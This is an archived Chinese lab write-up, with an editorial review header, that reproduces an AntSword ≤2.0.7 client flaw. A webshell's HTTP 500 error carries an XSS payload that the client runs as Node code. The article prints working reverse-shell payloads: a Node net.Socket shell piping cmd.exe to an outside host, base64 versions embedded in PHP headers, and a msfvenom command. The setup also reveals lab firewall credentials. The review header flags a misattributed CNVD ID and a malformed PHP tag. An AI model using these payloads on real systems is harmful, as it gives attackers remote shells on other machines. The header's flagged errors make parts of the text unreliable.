---
cnvd: "CNVD-2021-30167"
source: "MrWQ/vulnerability-paper"
id: "vw-5695d90e857f7a0c7a45fd5b"
entity_id: "ve-5695d90e857f7a0c7a45fd5b"
schema_version: "1"
fofa_unverified: "”工程师"
title: "分享   蚁剑 RCE 反制复现"
product: "AntSword客户端≤2.0.7，PHPCMS为实验宿主"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "reference"
primary_identifiers: ""
referenced_identifiers: "CNVD-2021-30167"
prerequisites: "用户用受影响客户端连接攻击者可控服务响应；测试Win10，关闭防护是实验条件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/%E5%88%86%E4%BA%AB%20%20%20%E8%9A%81%E5%89%91%20RCE%20%E5%8F%8D%E5%88%B6%E5%A4%8D%E7%8E%B0.md"
review_date: "2026-10-02"
side_effects: "回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_url: "https://mp.weixin.qq.com/s/thLttnT09Qr53bTKejw5BA"
source_status: "recorded"
previous_identifier_role: "unknown"
previous_referenced_identifiers: ""
---

# 分享   蚁剑 RCE 反制复现

> 编号角色校订（2026-10-04）：按归档技术正文区分主讨论编号与背景引用，更新 `primary_identifiers` / `referenced_identifiers` 及旧字段角色。旧编号原值、状态与正文保持原样，变更前字段逐字保存在 `previous_*`；后文旧的角色待核说明应按当前字段阅读。这里的角色判读不等于官方分配核验或漏洞复现。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：AntSword客户端≤2.0.7，PHPCMS为实验宿主
- 本文讨论：HTTP500错误HTML渲染至Node执行，无主CVE/CNVD证据
- 版本、权限与配置前提：用户用受影响客户端连接攻击者可控服务响应；测试Win10，关闭防护是实验条件
- 资料类型：AntSword恶意响应XSS到客户端执行实验；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- frontmatter CNVD-2021-30167来自页尾用友NC推荐，错误套给蚁剑；FOFA值也是推荐标题碎片
- PHP片段&lt;?phpheader缺分隔，不能正确按PHP开放标签解析
- 大篇拓扑/反向连接配置掩盖客户端根因，关闭杀软不能作为通用必需前提
- ≤2.0.7与文中v2.0需区分启动器/核心版本；2.0.7不能装Linux断言无来源
- 示例公网地址及实验材料应去敏，蓝队反制不是泛授权
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 真实版本范围、修复及截图执行证据待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/thLttnT09Qr53bTKejw5BA)

![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)

**Zero**

  

**漏洞概述**

中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。  
2019 年 4 月 12 日凌晨，有用户在中国蚁剑 GitHub 上提交了 issue，称发现中国蚁剑存在 XSS 漏洞，借此可引起 RCE。据悉，该漏洞是因为在 webshell 远程连接失败时，中国蚁剑会返回错误信息，但因为使用的是 html 解析，导致 xss 漏洞。

![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)

**One**

  

**影响范围**

AntSword <=2.0.7

![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)

**Two**

  

**实验环境搭建**

### **●****环境拓扑**

![](../../.resource/remote/c71248608a16459f34d99a24ea7f8e09b6c4729d85748c7fee641713c37d6563.png)

### **●****安装 v2.0.7 版本蚁剑**

版本 2.0.7 的蚁剑不能安装在 Linux 系统，所以将 Windows 10 物理机当做红队使用的主机。

> 下载地址：链接：https://pan.baidu.com/s/1x8bXH-ph6wRCZcmIt_HHDw  
> 提取码：rizb

1. 将压缩包解压，解压之后。

![](../../.resource/remote/d09d0a6affed524e289a64633a5fbad91533d6e36a0810f0489707b45353f96a.png)

2. 打开启动器, 选择 windows 版本，双击 AntSword.exe 启动文件。

![](../../.resource/remote/3e601f025e32c284b4e2ad22a73d54be1e1f95e374ae1206f08c3745240cdfc5.png)

3. 初始化, 配置核心源代码文件位置。

![](../../.resource/remote/226884bf6e96f6632b1014c17339354b4c052ad2adae5214323fd787a9069f80.png)

![](../../.resource/remote/a4ea3e890d455eef10f73d03b7de09f91310180d653a1d0207bf0ff386cbb580.png)

4. 双击 AntSword.exe 重启。

![](../../.resource/remote/49935d5051e311148195620e7ba2ebbb0a8328458fe9df24a51a65d1ed94c2a5.png)

### **●****蓝队靶标 Centos 7**

Centos 7 自动获取到的 IP 地址为 10.10.19.50  
1. 在靶机上搭建 LAMP 服务和 phpcms v9.6.0 环境。

![](../../.resource/remote/105a1936c14f629a118bc442ad7b2d47d96dc4e6277bc8d2a4d9d8d872f71289.png)

2. 边界 FW2 防火墙开放对应的接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)

点击 “网络 -> 防火墙 ->端口转发 ->新增”，则可以添加新的端口转发规则。

![](../../.resource/remote/57d3be354266ad3cc59e9b1ff01f63f191c0b219d4b51ac00278aa7e2924483c.png)

设置新的端口转发规则。

![](../../.resource/remote/8654878383658962f89ee86893e93f86f4a24f082f4dae0f314983eb1bf9c784.png)

> 名称：可以任意取名，建议与规则相关；  
> 协议：可以选择 TCP、UDP、ICMP，一个规则最好只选一个协议，不然容易出问题；  
> 源区域：这个指的是外网所在的区域，我们事先配置好了每个接口一个区域，因此只要选对应接口即可，FW2 选 ETH4，FW1 选 ETH2；  
> 外部端口：这里是外网供访问的端口号，可以填单个端口或者一个端口段，如 8000-9000；  
> 目标区域：这里填写的是前往内网服务器路由的出接口，以 FW2 为例，如果要映射服务器就填写 ETH3；  
> 内部 IP 地址：这里填写内网服务器的 IP 地址，在下拉框的最后可以输入 ip 按回车即可变为可选的 ip；  
> 内部端口：这里填写内部服务器要映射的端口，可以填单个端口或者一个端口段，如 8000-9000。

配置完成后点击右下角保存，即可增加规则，但规则不会马上生效。规则是自上而下进行匹配的，可以按住规则右侧的白色按钮上下拖动调整顺序，最后点击 “保存并应用” 方可生效。

![](../../.resource/remote/464b332c86d69ea73e33481342ea592f2619b36456e893dfbdfa111d312e8a04.png)

**●****蓝队靶标 Windows Server 2016**  

Windows Server 2016 自动获取到的 IP 地址是 10.10.19.51  
1. 使用 phpstudy 搭建，启动 nginx+mysql 服务。

![](../../.resource/remote/2b0d5f583ebb450e2b5336a8eee4a0f215b185022dfa8bb38dbe4e9ecfe9e2bc.png)

2. 搭建好 phpcms v9.6.0 环境。

![](../../.resource/remote/9f69a32dab5f80d998e091fae1a3c620a11e0e6459e68126ce67d27911302248.png)

3. 边界 FW2 防火墙开放对应的接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)

点击 “网络 -> 防火墙 ->端口转发 ->新增”，则可以添加新的端口转发规则。

![](../../.resource/remote/57d3be354266ad3cc59e9b1ff01f63f191c0b219d4b51ac00278aa7e2924483c.png)

设置新的端口转发规则。

![](../../.resource/remote/5d11da7527e997e3f940bd378f7a08d70b1df2672a8166d87642a22989f9d167.png)

> 将靶标 Windows Server 2016 上的 phpcms 平台映射到公网 66.28.5.2 的 80 端口上

配置完成后点击右下角保存，即可增加规则，但规则不会马上生效。规则是自上而下进行匹配的，可以按住规则右侧的白色按钮上下拖动调整顺序，最后点击 “保存并应用” 方可生效。

![](../../.resource/remote/ed1a603d621623a22508ba6a28e8a71809133ff17130b8951961c7caf572b48c.png)

![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)

**Three**

  

**反制**

### ****●**反制条件**

#### **红队：Windows 10 蓝队: Centos 7**

1. 红队通过 phpcms v9.6.0 文件上传漏洞，上传了一句话木马文件，并且使用蚁剑成功连接。

![](../../.resource/remote/3041c457cd6c4c06b6ba7b43d3dfb6ef6b8ba5bfa51d756fe8f68367a3d0a713.png)

![](../../.resource/remote/56b06f5992ff0df2f8e34ac17027e311c5ba4d49dc069f0755892762e3d476cc.png)

2. 蓝队 Centos 7 ：关闭防火墙。

![](../../.resource/remote/6fa6e8884e40ec7ee005eb84adac3296aa6e69e32f4f2183b19b5329b726bcc2.png)

3. 边界 FW2 防火墙开放接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)

点击 “网络 -> 防火墙 ->端口转发”，则可以看到端口转发规则。

![](../../.resource/remote/158082a795a2f951f5b3190b1bf79c7a58d86a4c7f9520ac593268d8f95375e3.png)

点击 “编辑”，进入修改端口转发规则。

![](../../.resource/remote/b4161c2b4b97c82d974c4672bc13475243fa85fba597e81af30ff592e8c9b9bb.png)

配置完成后点击右下角保存，即可修改规则，最后点击 “保存并应用” 方可生效。

#### **红队：Windows 10 蓝队：Windows Server 2016**

1. 红队通过 phpcms v9.6.0 文件上传漏洞，上传了一句话木马文件，并且使用蚁剑成功连接。

![](../../.resource/remote/1699cd0c414cd0528943a3f42aabcf9faa9bb18ab3e05572455af34aca5fb131.png)

![](../../.resource/remote/664e084b8b7fb7813e7d46aafe8a52f615e3f36949fbfd19dc46dc820b3f9561.png)

2. 蓝队 Windows Server 2016：关闭防火墙。

![](../../.resource/remote/25a6e81a926870a1cf3b21c8f748cc7646dc287ed9523fb82bf48be87c5a1294.png)

3. 边界 FW2 防火墙开放接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](../../.resource/remote/945b8a26c5712e24ed05cdc53834d3ab1a36ef1765a17cd74b711b661214621c.png)

点击 “网络 -> 防火墙 ->端口转发”，则可以看到端口转发规则。

![](../../.resource/remote/d2dccf5e194faf80587ba9ff7f9a8c76ebdce41c3f89c430e03c5320a7133ecc.png)

点击 “编辑”，进入修改端口转发规则。

![](../../.resource/remote/23effb2d8c8e84352f19575b2977d1822ee8d0fad2f09fcd09306cab450f2211.png)

配置完成后点击右下角保存，即可修改规则，最后点击 “保存并应用” 方可生效。

![](../../.resource/remote/82e2525241cc00f98e95c0114f1e9a702782c41546be0fe389573e2cb3149853.png)

4. 红队 Windows 10 关闭杀毒软件，比如火绒、360 等等。

![](../../.resource/remote/a0c7413888dda46fe8ed8f64ac10a73817b848dbe8b0e5bfdc433c4faeec17f1.png)

> 如果没有关闭火绒，则会报僵尸网络攻击，并将攻击进行拦截。

### ****●******反制目的**

当红队再次使用蚁剑连接时，直接反弹 shell，蓝队可以反控红队机器。

### ****●******反制开始条件**

#### **红队：Windows 10 蓝队: Centos 7**

1. 蓝队检查日志时，发现红队使用蚁剑 v2.0 连接了 20220609050516861.php。

![](../../.resource/remote/6934ed77a543b4e4dd6a721dd066e05afa858155a27cbe6fadbc3ebd5fa1f6d7.png)

2. 查看 20220609050516861.php，发现该文件是一句话木马文件。

![](../../.resource/remote/8c4032e44c9faf82ac5fa124589616f7f1049fce462401128f28b8b37eb7f5c3.png)

### ****●******反制过程**

#### **Centos 7**

1. 蓝队就准备根据蚁剑 v2.0 漏洞进行反制红队，制作 payload，修改 20220609050516861.php 内容。  
1.1 使用 net.Socket 方法制作木马  
将以下内容进行 base64 编码, 66.28.5.2 为蓝队 centos 7 映射到公网上的 IP 地址，监听端口为 10099。

```
var net = require("net"), sh = require("child_process").exec("cmd.exe");var client = new net.Socket();client.connect(10099, "66.28.5.2", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

> 在 Node.js 中提供了一个 net.Socket 对象，用于方便调用底层 Socket 接口，实现数据传输的功能。net.Socket 既可以读也可以写，这个 client 建立 socket 链接，实现了将对方 cmd.exe 的标准输入输出与标准错误流转发到受害者自己的 ip:10099 端口上。

将上面 base64 编码完成的内容放进 Buffer 函数中。

```
<?phpheader("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCgxMDA5OSwgIjY2LjI4LjUuMiIsIGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=`,`base64`).toString())'>");?>
```

1.2 使用 MSF 生成 node.js 木马  
使用 msfvenom 命令生成木马

> msfvenom -p nodejs/shell_reverse_tcp LHOST=66.28.5.2 LPORT=10099 -f raw -o payload.js

![](../../.resource/remote/bf3d0caf0d5783373f6a0c22a7fd9a3a124396bb50a86b0df8936bed1d6fca50.png)

将 payload.js 中的内容进行 base64 编码，将 base64 编码完成的代码放进 Buffer 函数。  

![](../../.resource/remote/3d703bc15de211aab41192086cd101237f694ce9d8de0e15f20c89b94c243019.png)

```
<?phpheader("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`KGZ1bmN0aW9uKCl7IHZhciByZXF1aXJlID0gZ2xvYmFsLnJlcXVpcmUgfHwgZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDsgaWYgKCFyZXF1aXJlKSByZXR1cm47IHZhciBjbWQgPSAoZ2xvYmFsLnByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vaSkpID8gImNtZCIgOiAiL2Jpbi9zaCI7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHV0aWwgPSByZXF1aXJlKCJ1dGlsIiksIHNoID0gY3Auc3Bhd24oY21kLCBbXSk7IHZhciBjbGllbnQgPSB0aGlzOyB2YXIgY291bnRlcj0wOyBmdW5jdGlvbiBTdGFnZXJSZXBlYXQoKXsgY2xpZW50LnNvY2tldCA9IG5ldC5jb25uZWN0KDEwMDk5LCAiNjYuMjguNS4yIiwgZnVuY3Rpb24oKSB7IGNsaWVudC5zb2NrZXQucGlwZShzaC5zdGRpbik7IGlmICh0eXBlb2YgdXRpbC5wdW1wID09PSAidW5kZWZpbmVkIikgeyBzaC5zdGRvdXQucGlwZShjbGllbnQuc29ja2V0KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50LnNvY2tldCk7IH0gZWxzZSB7IHV0aWwucHVtcChzaC5zdGRvdXQsIGNsaWVudC5zb2NrZXQpOyB1dGlsLnB1bXAoc2guc3RkZXJyLCBjbGllbnQuc29ja2V0KTsgfSB9KTsgc29ja2V0Lm9uKCJlcnJvciIsIGZ1bmN0aW9uKGVycm9yKSB7IGNvdW50ZXIrKzsgaWYoY291bnRlcjw9IDEwKXsgc2V0VGltZW91dChmdW5jdGlvbigpIHsgU3RhZ2VyUmVwZWF0KCk7fSwgNSoxMDAwKTsgfSBlbHNlIHByb2Nlc3MuZXhpdCgpOyB9KTsgfSBTdGFnZXJSZXBlYXQoKTsgfSkoKTs=`,`base64`).toString())'>");?>
```

2. 开启监听端口  
蓝队使用 nc 开启监听 10099 端口。

![](../../.resource/remote/d9966bb5f24aee78d410aec06a47ef6b069b0fcedd0af635e7260b007df394b5.png)

3. 当红队再一次使用蚁剑进行连接 webshell 时，发现报错，可能以为自己的密码错了或者木马文件没了，而此时，红队已经被蓝队控制了。

![](../../.resource/remote/1044101763f5b7ba047c09cbf03e0feb6aaf3e66041863256d160425a00a4092.png)

![](../../.resource/remote/c16ee53ec101a05cf095da9a7816eb93ab58c0e505e21936736d4a70c777230c.png)

### ****●******Windows Server 2016**

1. 蓝队就准备根据蚁剑 v2.0 漏洞进行反制红队，制作 payload，修改 20220609035913593.php 内容。  
将以下内容进行 base64 编码, 66.28.5.2 为蓝队靶机映射到公网上的 IP 地址，监听端口为 10088。

```
var net = require("net"), sh = require("child_process").exec("cmd.exe");var client = new net.Socket();client.connect(10088, "66.28.5.2", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

> 在 Node.js 中提供了一个 net.Socket 对象，用于方便调用底层 Socket 接口，实现数据传输的功能。net.Socket 既可以读也可以写，这个 client 建立 socket 链接，实现了将对方 cmd.exe 的标准输入输出与标准错误流转发到受害者自己的 ip:10088 端口上。

将上面 base64 编码完成的内容放进 Buffer 函数中。

```
<?phpheader("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCgxMDA4OCwgIjY2LjI4LjUuMiIsIGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=`,`base64`).toString())'>");?>
```

2. 开启监听端口  
蓝队靶机使用 nc 开启监听 10088 端口。

![](../../.resource/remote/db68679a5d00308abf72e3a5dae7141e239c112672438ef40d08cbdda8ea144b.png)

3. 当红队再一次使用蚁剑进行连接 webshell 时，发现报错，可能以为自己的密码错了或者木马文件没了，而此时，红队已经被蓝队控制了。

![](../../.resource/remote/add7b8d5c8e23a3616e96691307f290c4fd6bb81f5f544b149cec06a8e295a58.png)

![](../../.resource/remote/31daad778d4a3c4a6939ed89384914fe0c070192b97414062b5cd6b08aab4038.png)

![](../../.resource/remote/d82d0390401db5d82061ab86282b3eac9630ca782bffafadd5b9c04676a81d85.png)

**Four**

  

**参考材料**

1.https://mp.weixin.qq.com/s/IRVfXxmPJo2ynym2kl9X-Q  
2.https://github.com/AntSwordProject/antSword/issues/147  
3.https://mp.weixin.qq.com/s/nfa2DHkDPE43cIvvRmk1TA  
4.https://mp.weixin.qq.com/s/MfWuBm_H7JxAvBKfnTpLZQ

文章来源：国科漏斗社区

```
【往期推荐】

【内网渗透】内网信息收集命令汇总


【内网渗透】域内信息收集命令汇总

【超详细 | Python】CS免杀-Shellcode Loader原理(python)

【超详细 | Python】CS免杀-分离+混淆免杀思路


【超详细 | 钟馗之眼】ZoomEye-python命令行的使用


【超详细 | 附EXP】Weblogic CVE-2021-2394 RCE漏洞复现

【超详细】CVE-2020-14882 | Weblogic未授权命令执行漏洞复现

【超详细 | 附PoC】CVE-2021-2109 | Weblogic Server远程代码执行漏洞复现

【漏洞分析 | 附EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞

【CNVD-2021-30167 | 附PoC】用友NC BeanShell远程代码执行漏洞复现


【奇淫巧技】如何成为一个合格的“FOFA”工程师

【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】

【超详细】Fastjson1.2.24反序列化漏洞复现

  记一次HW实战笔记 | 艰难的提权爬坑

【漏洞速递+检测脚本 | CVE-2021-49104】泛微E-Office任意文件上传漏洞


免杀基础教学（上卷）


免杀基础教学（下卷）


走过路过的大佬们留个关注再走呗

往期文章有彩蛋哦




一如既往的学习，一如既往的整理，一如即往的分享


“如侵权请私聊公众号删文”

渗透Xiao白帽
积硅步以致千里，积怠惰以致深渊！
33篇原创内容
公众号

推荐阅读↓↓↓


EchoSec
萌新专注于网络安全行业学习
10篇原创内容
公众号

我知道你在看哟

```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
